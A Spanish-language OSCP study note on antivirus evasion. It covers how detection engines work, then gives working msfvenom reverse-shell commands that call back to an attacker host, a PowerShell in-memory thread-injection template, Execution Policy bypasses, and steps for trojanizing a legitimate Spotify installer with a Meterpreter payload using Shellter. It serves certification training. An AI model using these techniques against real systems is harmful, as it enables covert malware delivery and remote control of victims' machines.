---
tipo: modulo
modulo: 15
estado: repasado
tags:
  - oscp
  - explotacion
  - evasion
  - windows
fecha: 2026-10-05
---

# 15 - Antivirus Evasion

> [!abstract] Resumen
> Cómo funciona un **AV** y cómo **evadirlo** para ejecutar nuestro payload en el target. Tres bloques:
> - **15.1 Cómo funciona el AV:** firmas (conocido) vs ML/heurística/comportamiento (desconocido), engines (file/memory/network/disassembler/sandbox/ML) y métodos de detección. La firma por **hash** es frágil (1 bit → hash distinto).
> - **15.2 Técnicas de bypass:** **on-disk** (packers, obfuscators, **crypters**) vs **in-memory** (PE injection, reflective DLL, process hollowing, inline hooking) — estas últimas no tocan disco.
> - **15.3 En la práctica:** buenas prácticas de testing (OPSEC con VirusTotal/Kleenscan, desactivar sample submission, **código propio**), **bypass manual con PowerShell** (thread injection + `msfvenom psh-reflection`) contra Avira, y **automatizado con Shellter** (infectar un PE legítimo).
> Idea clave del examen: ejecutar en **memoria** vía PowerShell (scripts = texto, difíciles de firmar) y, para on-disk, backdoorear un binario legítimo con **Shellter**.

## Conceptos clave
- **AV**: previene/detecta/elimina malware. Hoy integra IDS/IPS, firewall, web scanners, etc.
- **Firma (signature)**: identifica un malware concreto. Puede ir de un **hash** genérico a secuencias binarias/strings específicas. **YARA** (2014) es un lenguaje abierto de firmas (usado en VirusTotal).
- **Conocido vs desconocido**: las firmas solo pegan malware ya documentado. Para lo **desconocido** → engines de **ML** (en la nube, requieren Internet).
- **EDR vs AV**: el **EDR** genera telemetría de eventos y la manda a un **SIEM** → visibilidad para el SOC. Complementa al AV, no lo sustituye.
- **Engines del AV**: File (scans programados/real-time vía **mini-filter driver** en kernel), Memory (inspecciona RAM de procesos, API sospechosas), Network (tráfico, bloquea C2), Disassembler (desofusca packers/cifrados), Sandbox/Emulator (ejecuta el malware aislado), Browser plugin, ML.
- **Métodos de detección**: (1) **Signature-based** (lista negra de firmas/hashes → cuarentena); (2) **Heuristic** (reglas sobre instrucciones/llamadas, no solo bytes); (3) **Behavioral** (ejecuta en sandbox y observa comportamiento); (4) **ML** (metadatos + modelos cloud). Se combinan.
- **Debilidad del hash**: cambiar 1 bit → hash totalmente distinto → evade firmas basadas solo en hash.
- **On-disk vs in-memory**: on-disk modifica el fichero en disco (donde más mira el AV); in-memory evita el disco por completo → menos detección.
- **Regla de oro OPSEC**: **código propio y diverso**. Las firmas se extraen de muestras conocidas → cuanto más novedoso, menos probabilidad de match.

> [!tip] Idea para el examen
> El bypass que entra: **thread injection con PowerShell** (plantilla con `VirtualAlloc`/`CreateThread`/`memset` + shellcode `msfvenom -f psh-reflection`). Un script es **texto interpretado** → difícil de firmar y fácil de mutar (variables/comentarios). Si lo bloquea la **Execution Policy**, usa `-Scope CurrentUser` o `-ExecutionPolicy Bypass`. Para on-disk, **Shellter** en Auto mode sobre un PE legítimo.

---

## 15.1 Componentes y operación del AV

### 15.1.1 Conocido vs desconocido
- Firmas = solo **amenazas ya documentadas**.
- ML engine (ej. Windows Defender) → detecta **desconocido**, pero opera en **cloud** (necesita Internet, no siempre disponible en servidores internos).
- **EDR** → telemetría de eventos → **SIEM** → el SOC ve ataques pasados/en curso.

### 15.1.2 Engines
File · Memory · Network · Disassembler · Emulator/Sandbox · Browser plugin · ML. Todos trabajan a la vez contra la **signature database** (actualizada desde el vendor) para clasificar eventos como benignos/maliciosos/desconocidos.

### 15.1.3 Métodos de detección — fragilidad del hash

Cambiar **un solo bit** de un fichero cambia por completo su hash → las firmas por hash son débiles:
```bash
echo "offsec" > malware.txt
xxd -b malware.txt                 # ver representación binaria (-b = binario)
# 00000000: 01101111 01100110 ... 01100011   offsec
sha256sum malware.txt              # c361ec96...510e
# cambiar la última 'c' por 'C' (1 bit distinto)
sha256sum malware.txt              # 15d0fa07...c37c  -> hash totalmente distinto
```

| Comando | Qué hace |
|---|---|
| `xxd -b <file>` | Dump binario: offset + bits + ASCII (`-b` = binario en vez de hex) |
| `sha256sum <file>` | Calcula el hash SHA256 |

**Generar un PE malicioso y medir detección** (línea base del módulo):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
```
Subido a **VirusTotal** → 50/67 vendors lo marcan (`Trojan.CryptZ.Gen`, `Windows.Trojan.Metasploit`, etc.). El payload crudo de `msfvenom` es **muy detectado**.

> [!warning] VirusTotal **comparte** la muestra (y su hash) con todos los vendors miembros → el hash es **público** desde la primera subida. No subas payloads reales de un engagement.

---

## 15.2 Técnicas de bypass

### 15.2.1 On-disk (modifican el fichero)
- **Packers**: comprimen/reescriben el PE → nuevo hash, funcionalmente equivalente. UPX solo **no** basta hoy.
- **Obfuscators**: mutan el código (instrucciones equivalentes, dead code, reordenar funciones) → dificultan reversing y firmas.
- **Crypters**: cifran el código y añaden un **stub de descifrado** que lo restaura **en memoria** → en disco solo queda lo cifrado. Muy efectivo.
- Evasión seria = combinar todo + anti-reversing/anti-debug/anti-VM. Pocas herramientas gratis buenas; comercial: **The Enigma Protector**.

### 15.2.2 In-memory (no tocan disco)
- **Remote Process Memory Injection (PE injection)**: inyectar el payload en otro PE legítimo vía APIs de Windows:
  `OpenProcess` (HANDLE) → `VirtualAllocEx` (reservar memoria) → `WriteProcessMemory` (copiar payload) → `CreateRemoteThread` (ejecutar en un hilo).
- **Reflective DLL Injection**: cargar una DLL desde **memoria** (no desde disco). `LoadLibrary` no lo soporta → hay que reimplementar la API.
- **Process Hollowing**: lanzar un proceso legítimo **suspendido**, vaciar su imagen y reemplazarla por la maliciosa, reanudar.
- **Inline Hooking**: insertar un **hook** (salto) en una función para desviar a código propio y luego volver. Típico de **rootkits** (necesitan admin).

---

## 15.3 Evasión en la práctica

### 15.3.1 Buenas prácticas de testing (OPSEC)
- **VirusTotal** reparte la muestra a todos los vendors → tras subirla, generan firma y queman tu tooling.
- Alternativa: **Kleenscan.com** (30 engines, no comparte con terceros, 4 scans/día gratis).
- Lo ideal si conoces el AV del cliente: **VM espejo** del entorno.
- En Windows Defender: **desactivar Automatic Sample Submission** (*Windows Security > Virus & threat protection > Manage Settings*) para que no mande muestras a la nube.
- Cloud protection + sample submission requieren **Internet** → comprueba si el target lo tiene (muchos servidores de producción, no).
- **Prefiere siempre código propio** (menos firmas que casar).

> [!warning] No subas a VirusTotal tu bypass ya afinado: las ML cloud lo analizan y lo queman. Úsalo solo para una idea aproximada con payloads que no te importe quemar.

### 15.3.2 Bypass manual con PowerShell (thread injection) — vs Avira

Target: **Avira Free Security** en Windows 11 (acceso por RDP). El `binary.exe` de msfvenom lo detecta y pone en cuarentena al instante.

**Técnica**: inyección en memoria en el **propio** proceso `powershell.exe` (x86). PowerShell puede llamar a la **Windows API**. Plantilla:
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```
- `VirtualAlloc` → reservar memoria; `CreateThread` → ejecutar un hilo; `memset` → escribir datos en la memoria reservada.

**Generar el shellcode** en formato PowerShell reflection y pegarlo en `<place shellcode here>`:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
```

> [!tip] `psh-reflection` ya genera **nombres de variables y funciones aleatorios** en cada ejecución → evade firmas estáticas por strings. Los scripts son texto interpretado → difíciles de fingerprint y fáciles de mutar (variables, comentarios, lógica) sin recompilar.

Resultado contra el script `bypass.ps1`: VirusTotal lo marca 25/63, pero **Avira no lo detecta**. Quick Scan de Avira en el Win11 → limpio.

**Ejecutar** (OJO: payload x86 → usar **Windows PowerShell (x86)**). Si salta la Execution Policy:
```powershell
.\bypass.ps1
# -> running scripts is disabled on this system (Execution Policy)

Get-ExecutionPolicy -Scope CurrentUser                               # Undefined
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser # cambiar (responder A)
# alternativa por script, sin cambio global:
powershell -ExecutionPolicy Bypass -File .\bypass.ps1
```

| Comando / flag | Qué hace |
|---|---|
| `Get-ExecutionPolicy -Scope CurrentUser` | Ver la policy del usuario actual |
| `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` | Permitir scripts para el usuario (no requiere admin, es **per-user**) |
| `-ExecutionPolicy Bypass -File` | Saltar la policy solo para esa ejecución (sin cambio global) |

Listener en Kali y ejecutar:
```bash
nc -lvnp 443        # en Kali
```
```powershell
.\bypass.ps1        # en el target -> reverse shell en Kali (client01\offsec)
```

> [!important] La **Execution Policy NO es un mecanismo de seguridad**: es per-user y se salta con `-Scope CurrentUser` o `-ExecutionPolicy Bypass`. Si está impuesta por **GPO**, busca otros vectores. Ojo: ML/EDR maduros pueden analizar el contenido del script y alertar al SOC igualmente.

### 15.3.3 Automatizar con Shellter (on-disk, PE infector)

**Shellter**: inyecta shellcode en un PE **legítimo** analizando sus rutas de ejecución y reutilizando entradas de la **IAT** (no crea secciones ni cambia permisos → no dispara firmas típicas). Gratis para 32-bit; Pro soporta 64-bit.

```bash
apt-cache search shellter
sudo apt install shellter
# Shellter corre bajo Windows -> instalar wine
sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
shellter        # abre la consola de Shellter bajo wine
```

Flujo interactivo (Auto mode sobre el instalador de Spotify 32-bit):
```text
Choose Operation Mode - Auto/Manual (A/M/H): A
PE Target: /home/kali/Downloads/SpotifyFullWin10-32bit.exe
    -> Backup: Shellter_Backups\spotifysetup.exe   (hace copia del original)
Enable Stealth Mode? (Y/N/H): Y                    # restaura el flujo normal del PE tras el payload
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1                         # Meterpreter_Reverse_TCP
SET LHOST: 192.168.50.1
SET LPORT: 443
    -> Injection: Verified!                        # comprueba que alcanza la 1ª instrucción
```

> [!tip] **Stealth Mode** restaura la ejecución del PE para que el programa (Spotify) funcione normal y no levante sospechas. Con payloads custom, deben terminar saliendo del hilo actual. En Win11 los no-Meterpreter fallaron → usar **Meterpreter**. En engagements reales, elige un binario **poco escrutado** (no uno famoso).

Handler en Kali para el Meterpreter y entregar el PE backdooreado:
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```
Avira Quick Scan sobre el Spotify infectado → **limpio** (Shellter ofusca payload y decoder). Al ejecutarlo → **Meterpreter session** en Kali (`client01\offsec`).

| Parte | Qué hace |
|---|---|
| `shellter` (Auto mode) | Analiza el PE e inyecta shellcode reutilizando la IAT |
| **Stealth Mode** | Restaura el flujo del PE para que el programa legítimo siga funcionando |
| `msfconsole -x "..."` | Lanza msfconsole ejecutando comandos directos (handler no interactivo) |
| `multi/handler` | Listener genérico de Metasploit para recibir el payload |

---

## Ejemplo práctico
> [!example] Dos bypass contra Avira
> **Manual (in-memory):** `msfvenom ... -f psh-reflection` → pegar en la plantilla (`VirtualAlloc`/`CreateThread`/`memset`) → `bypass.ps1` (Avira no lo pilla) → PowerShell **x86** → saltar Execution Policy (`-Scope CurrentUser` / `-ExecutionPolicy Bypass`) → `nc -lvnp 443` → reverse shell.
> **Automático (on-disk):** `shellter` Auto + Stealth sobre `SpotifyFullWin10-32bit.exe` → Meterpreter_Reverse_TCP (LHOST/LPORT) → Avira Quick Scan limpio → `msfconsole -x "...multi/handler..."` → ejecutar PE → **Meterpreter**.

## Relacionado
- Técnicas: [[Evasion AV con PowerShell (Thread Injection)]] · [[Shellter]]
- Cheatsheet: [[Explotacion y Shells]]
- Módulo previo: [[14 - Fixing Exploits]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - `msfvenom` a fondo (encoders, formatos, `-x`/`-k` para backdoorear PE sin Shellter) — se ve en módulo posterior.
> - Meterpreter vs shell estándar: diferencias y cuándo usar cada uno (módulo posterior).
> - ¿Cómo evadir cuando hay **EDR + SOC** o la policy está por **GPO**? Vectores alternativos de ejecución PS.
